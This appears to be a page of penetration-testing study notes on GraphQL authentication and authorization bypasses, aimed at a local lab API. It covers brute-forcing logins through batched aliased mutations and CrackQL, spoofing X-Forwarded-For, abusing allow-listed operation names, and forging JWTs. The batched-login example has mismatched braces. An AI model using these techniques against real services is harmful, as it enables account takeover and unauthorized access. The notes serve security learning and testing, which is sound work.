# AUTHENTICATION AND AUTHORIZATION BYPASSES

### Fundamental Concepts

* **Authentication**: This is the process of verifying a client's identity.
* **Authorization**: This process determines what actions and data a client is allowed to access after their identity is verified.
* **GraphQL's Role**: GraphQL itself doesn't have built-in authentication or authorization mechanisms; these are left to the developers to implement. This variability in implementation introduces potential vulnerabilities.

### In-Band vs. Out-of-Band Controls

* **In-band Authentication and Authorization**: These controls are implemented directly within the GraphQL API.
  * This approach increases the **attack surface**, making the API more vulnerable to direct attacks.
  * When authentication and authorization mechanisms are part of the GraphQL schema, they are more likely to be targeted and potentially bypassed.
* **Out-of-band Authentication and Authorization**: These delegate the security functions to external systems, which can be a more secure approach.

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption><p>The gateway, API, business, and persistence layers</p></figcaption></figure>

### Common Authentication Approaches

* **HTTP Basic Authentication**: This method sends credentials in the header of a client request.
  * It is straightforward but can be insecure if not implemented over HTTPS.

```bash
Authorization: Basic <base64_encoded_credential>
-------------------------
Authorization: Basic YWRtaW46YmxhY2toYXRncmFwaHFsCg==
---------------------------------------
echo "YWRtaW46YmxhY2toYXRncmFwaHFsCg==" | base64 -d
admin:blackhatgraphql
```

* **OAuth 2.0 with JSON Web Tokens (JWT)**: A common approach allowing third-party applications to obtain temporary access to a GraphQL API.
  * **JWTs** are vulnerable if not implemented securely.
  * A common vulnerability is the `alg` (algorithm) header parameter being set to `none`, bypassing signature verification.

{% code overflow="wrap" %}
```bash
# A sample JWT token
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwi
aWF0IjoxNjU2NDY0MDIyLCJuYmYiOjE2NTY0NjQwMjIsImp0aSI6ImY0OThmZmQxLWU0
YzctNGU5Mi05ZTRhLWJiNzRiZmVjZTE4ZiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJl
eHAiOjE2NTY0NzEyMjJ9.NHs6JiLDONJsC9LpJzdBB8enXzIrqI0Cvqojj8SqA4s

-------------------------
# Decode Header
echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d
{
    "typ": "JWT",
    "alg": "HS256"
}
--------------------------
# Decode Payload Section
echo "eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU2NDY0MDIyLCJuYmYiOjE2NTY0NjQwMjIsImp0aSI6ImY0OThmZmQxLWU0YzctNGU5Mi05ZTRhLWJiNzRiZmVjZTE4ZiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTY0NzEyMjJ9" | base64 -d
{
    "type": "access",
    "iat": 1656464022,
    "nbf": 1656464022,
    "jti": "f498ffd1-e4c7-4e92-9e4a-bb74bfece18f",
    "identity": "operator",
    "exp": 1656471222
}
```
{% endcode %}

* **Other Methods**:
  * Libraries such as **GraphQL Modules** and **GraphQL Shield** can be used to implement authorization logic within the schema.

```graphql
# The Authentication module from the GraphQL Modules library
extend type Query {
    me: User
}

type Mutation {
    login(username: String!, password: String!): User
    signup(username: String!, password: String!): User
}

extend type User {
    username: String!
}

------------------------------
# A GraphQL Shield code example
const permissions = shield({
    Query: {
        frontPage: not(isAuthenticated),
        fruits: and(isAuthenticated, or(isAdmin, isEditor)),
        customers: and(isAuthenticated, isAdmin),
    },
    Mutation: {
        addFruitToBasket: isAuthenticated,
    },
    Fruit: isAuthenticated,
    Customer: isAdmin,
})
```

* **Custom schema directives** (e.g., `@auth`, `@protect`, or `@hasRole`) can enforce authorization rules at the schema level.

| Directive name | Argument name | Argument type |
| -------------- | ------------- | ------------- |
| @auth          | requires      | String        |
| @protect       | role          | String        |
| @hasRole       | role          | String        |

* Some APIs use **IP-based allow lists** for authorization, but these lack granularity.

{% code overflow="wrap" %}
```bash
curl -X POST http://localhost:5013/graphql -d '{"query":"{__typename }"}' -H "Content-Type: application/json" -H "X-Forwarded-For: 10.0.0.1"
```
{% endcode %}

### Detecting the Authentication Layer

* **Canary Queries**: Sending specific test queries can reveal how the API responds, indicating the presence of authentication mechanisms.
* **Analyzing Error Messages**: Error messages can provide clues about the authentication process.
* **Identifying Mutations**: Look for mutations like `login`, `signup`, `register`, `createUser`, or `createAccount` that hint at an authentication setup.

**Common GraphQL Authentication Errors**

<table><thead><tr><th width="404">Error message</th><th>Possible authentication implementation</th><th data-hidden></th></tr></thead><tbody><tr><td>Authentication credentials are missing. Authorization header is required and must contain a value.</td><td>OAuth 2.0 Bearer with JSON Web Token</td><td></td></tr><tr><td>Not Authorised!</td><td>GraphQL Shield</td><td></td></tr><tr><td>Not logged in  Auth required API key is required</td><td>GraphQL Modules</td><td></td></tr><tr><td>Invalid token! <br>Invalid role!</td><td>graphql-directive-auth</td><td></td></tr></tbody></table>



### Exploiting Authentication Controls

* **Brute-Forcing Passwords**:
  * **Query batching** can be used to bypass rate-limiting by combining multiple login attempts in a single request.

```bash
mutation {
    alias1: login(username: "admin", password: "admin") {
        accessToken
    }
    alias2: login(username: "admin", password: "password") {
        accessToken
    }
    alias3: login(username: "admin", password: "pass") {
        accessToken
    }
    alias4: login(username: "admin", password: "pass123") {
        accessToken
    }
    alias5: login(username: "admin", password: "password123")
    {
        accessToken
    }
    alias6: login(username: "operator", password: "operator"){
    {
        accessToken
    }
    alias7: login(username: "operator", password: "password")
        accessToken
    }
    alias8: login(username: "operator", password: "pass") {
        accessToken
    }
    alias9: login(username: "operator", password: "pass123"){
        accessToken
    }
    alias10: login(username: "operator", password: "password123"){
        accessToken
    }
}
```

* Tools like **CrackQL** can automate this process.

{% code overflow="wrap" %}
```bash
python3 CrackQL.py -t http://localhost:5013/graphql -q sample-queries/login.graphql -i sample-inputs/usernames_and_passwords.csv --verbose
```
{% endcode %}

* **Bypassing Allow-Listed Operation Names**: Attackers can bypass allow lists of operation names by spoofing or changing the operation name.

{% code overflow="wrap" %}
```graphql
# The following is an example of an unauthenticated mutation. As you can see, it would allow a user to register a new user account:
mutation RegisterAccount {
    register(username: "operator", password: "password"){
        user_id
    }
}

-----------------------------------
# An example operation that could bypass authentication by using an allow-listed operation nameWe used the allowed operation name to withdraw money with a withdrawal mutation.

mutation RegisterAccount {
    withdrawal(amount: 100.00, from: "ACT001", dest: "ACT002"){
        confirmationCode
    }
}
```
{% endcode %}

* **JWT Forgery**: If JWT signatures are not correctly verified, attackers can forge valid tokens.

{% code overflow="wrap" %}
```graphql
# jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU3MDQ2NjI5LCJuYmYiOjE2NTcwNDY2MjksImp0aSI6IjVkMzhkM2Y5LWNjNTUtNDcyYy1iNzRhLThiN2FlMzEyNGFlMiIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTcwNTM4MjksImFwaV90b2tlbiI6IkFQSV9TRUNSRVRfUEFTU1dPUkQifQ.iIQ9zMRP2bA0Yx8p7INurfC-PcVz3-KqfzEE4uQICbc

# decode
{
    "type": "access",
    "iat": 1657046629,
    "nbf": 1657046629,
    "jti": "5d38d3f9-cc55-472c-b74a-8b7ae3124ae2",
    "identity": "operator",
    "exp": 1657053829,
    "api_token":"API_SECRET_PASSWORD"
}
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploiting Authorization Controls

* **Authorization Testing**:
  * It's essential to identify all possible paths to a given object type, using tools like `graphql-path-enum`. This allows an attacker to understand the relationships within the schema and find authorization vulnerabilities.

```bash
./graphql-path-enum -i introspection.json -t PasteObject
```

{% embed url="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch07/starwars-schema.json" %}

* **Field stuffing** techniques can be used to attempt access to unauthorized fields.
* **CrackQL** can be used to automate field and argument brute-forcing.

{% code overflow="wrap" %}
```bash
python3 CrackQL.py -t http://localhost:5013/graphql -q sample-queries/users.graphql -i sample-inputs/users.csv --verbose
```
{% endcode %}

* **Inconsistent Protection**: Developers might protect some queries but not others, offering different paths to the same data. For example, `pastes` might be protected, but not `paste` or `readAndBurn`.
